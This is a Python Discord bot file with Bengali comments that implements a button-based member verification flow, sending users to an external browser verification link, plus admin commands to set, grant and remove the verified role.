# bot.py
import discord
from discord.ext import commands
import json
import base64
import time
import re
from config import BOT_TOKEN, CLIENT_ID,  GUILD_ID, VERIFIED_ROLE_ID

# ============= Discord বট সেটআপ =============
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ============= Discord বট ইভেন্ট =============
@bot.event
async def on_ready():
    print(f'✅ বট {bot.user} লগ ইন করেছে!')
    print(f'✅ বটের ইউজার আইডি: {bot.user.id}')
    print(f'✅ গিল্ড আইডি: {GUILD_ID}')
    print(f'✅ ভেরিফাইড রোল আইডি: {VERIFIED_ROLE_ID}')

# ============= বট কমান্ড =============
@bot.command()
async def verify(ctx):
    """প্রথম ভেরিফিকেশন মেসেজ পাঠায়"""
    
    try:
        # ⭐ চেক করুন ইউজার ইতিমধ্যে ভেরিফাইড কিনা
        role = discord.utils.get(ctx.guild.roles, id=int(VERIFIED_ROLE_ID))
        if role and role in ctx.author.roles:
            embed = discord.Embed(
                title="⛔️ Verification failed",
                description=f"You are already verified on this server!",
                color=0x00FF00
            )
            await ctx.send(embed=embed, ephemeral=True)
            return
        
        embed1 = discord.Embed(
            title="Verification Required",
            description="In order to get access to **Channel** you must click the button below.",
            color=0xFF0000
        )
        
        view1 = discord.ui.View()
        button1 = discord.ui.Button(
            label="Verify",
            style=discord.ButtonStyle.primary,
            custom_id=f"verify_btn_{ctx.author.id}"
        )
        view1.add_item(button1)
        
        await ctx.send(embed=embed1, view=view1)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
        print(f"❌ Error: {str(e)}")

@bot.command()
async def test(ctx):
    """টেস্ট কমান্ড"""
    await ctx.send("✅ বট কাজ করছে!")

@bot.command()
@commands.has_permissions(administrator=True)
async def setrole(ctx, role: discord.Role):
    """ভেরিফাইড রোল সেট করুন (শুধু অ্যাডমিন)"""
    global VERIFIED_ROLE_ID
    
    try:
        # কনফিগ ফাইল আপডেট করুন
        with open('config.py', 'r', encoding='utf-8') as f:
            config_content = f.read()
        
        # রোল আইডি আপডেট
        config_content = re.sub(
            r'VERIFIED_ROLE_ID = ".*?"',
            f'VERIFIED_ROLE_ID = "{role.id}"',
            config_content
        )
        
        with open('config.py', 'w', encoding='utf-8') as f:
            f.write(config_content)
        
        VERIFIED_ROLE_ID = str(role.id)
        await ctx.send(f"✅ ভেরিফাইড রোল সেট করা হয়েছে: **{role.name}** (ID: {role.id})")
        print(f"✅ রোল আপডেট: {role.name} ({role.id})")
        
    except Exception as e:
        await ctx.send(f"❌ রোল সেট করতে ব্যর্থ: {str(e)}")

@bot.command()
async def checkrole(ctx):
    """আপনার রোল চেক করুন"""
    try:
        role = discord.utils.get(ctx.guild.roles, id=int(VERIFIED_ROLE_ID))
        if role is None:
            await ctx.send("❌ ভেরিফাইড রোল পাওয়া যায়নি! অ্যাডমিনকে `!setrole` ব্যবহার করতে বলুন।")
            return
            
        if role in ctx.author.roles:
            await ctx.send(f"✅ আপনি ইতিমধ্যে **{role.name}** রোল পেয়েছেন!")
        else:
            await ctx.send(f"❌ আপনি এখনও **{role.name}** রোল পাননি। `!verify` ব্যবহার করুন।")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@commands.has_permissions(administrator=True)
async def addrole(ctx, member: discord.Member):
    """ম্যানুয়ালি রোল অ্যাড করুন (শুধু অ্যাডমিন)"""
    try:
        role = discord.utils.get(ctx.guild.roles, id=int(VERIFIED_ROLE_ID))
        if role is None:
            await ctx.send("❌ ভেরিফাইড রোল পাওয়া যায়নি!")
            return
            
        await member.add_roles(role)
        await ctx.send(f"✅ **{member.display_name}** কে **{role.name}** রোল দেওয়া হয়েছে!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@commands.has_permissions(administrator=True)
async def removerole(ctx, member: discord.Member):
    """ম্যানুয়ালি রোল রিমুভ করুন (শুধু অ্যাডমিন)"""
    try:
        role = discord.utils.get(ctx.guild.roles, id=int(VERIFIED_ROLE_ID))
        if role is None:
            await ctx.send("❌ ভেরিফাইড রোল পাওয়া যায়নি!")
            return
            
        await member.remove_roles(role)
        await ctx.send(f"✅ **{member.display_name}** থেকে **{role.name}** রোল সরানো হয়েছে!")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ============= বাটন ইন্টারাকশন হ্যান্ডলার =============
@bot.event
async def on_interaction(interaction):
    """বাটন ক্লিক হ্যান্ডেল করে"""
    
    if interaction.type == discord.InteractionType.component:
        custom_id = interaction.data.get('custom_id', '')
        
        if custom_id.startswith('verify_btn_'):
            user_id = int(custom_id.split('_')[2])
            
            # চেক করুন ইউজার ম্যাচ করে কিনা
            if interaction.user.id != user_id:
                await interaction.response.send_message("❌ এই বাটন আপনার জন্য না!", ephemeral=True)
                return
            
            # ⭐⭐⭐ চেক করুন ইউজার ইতিমধ্যে ভেরিফাইড কিনা ⭐⭐⭐
            try:
                role = discord.utils.get(interaction.guild.roles, id=int(VERIFIED_ROLE_ID))
                if role and role in interaction.user.roles:
                    await interaction.response.send_message(
                        embed=discord.Embed(
                            title="⛔️ Verification failed",
                            description=f"You are already verified on this server!",
                            color=0x00FF00
                        ),
                        ephemeral=True
                    )
                    return
            except Exception as e:
                print(f"⚠️ রোল চেক করার সময় এরর: {e}")
            
            # ডেটা তৈরি করুন
            data = {
                "guildId": str(interaction.guild.id),
                "clientId": CLIENT_ID,
                "expires": int(time.time()) + 180,
                "userId": str(interaction.user.id),
                "username": str(interaction.user),
                "channelId": str(interaction.channel.id)
            }
            
            json_data = json.dumps(data)
            encoded_data = base64.b64encode(json_data.encode()).decode()
            
            verify_url = f"https://invite-tracker-production-7071.up.railway.app/verify?data={encoded_data}"
            
            embed2 = discord.Embed(
                title="Verification required for Channel",
                description="Click Open verification to complete the check in your browser.",
                color=0xFF0000
            )
            
            embed2.add_field(
                name="⏰ Expires",
                value=f"<t:{int(time.time()) + 180}:R>",
                inline=False
            )
            
            view2 = discord.ui.View()
            button2 = discord.ui.Button(
                label="Open verification",
                url=verify_url,
                style=discord.ButtonStyle.link
            )
            view2.add_item(button2)
            
            await interaction.response.send_message(
                embed=embed2,
                view=view2,
                ephemeral=True
            )
            
            print(f"✅ Verification started for {interaction.user}")

# ============= এরর হ্যান্ডলিং =============
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ এই কমান্ড ব্যবহার করার জন্য আপনার **Administrator** পারমিশন প্রয়োজন!")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ দয়া করে সঠিক আর্গুমেন্ট দিন! যেমন: `!setrole @role`")
    else:
        await ctx.send(f"❌ একটি এরর হয়েছে: {str(error)}")
        print(f"❌ Command Error: {str(error)}")
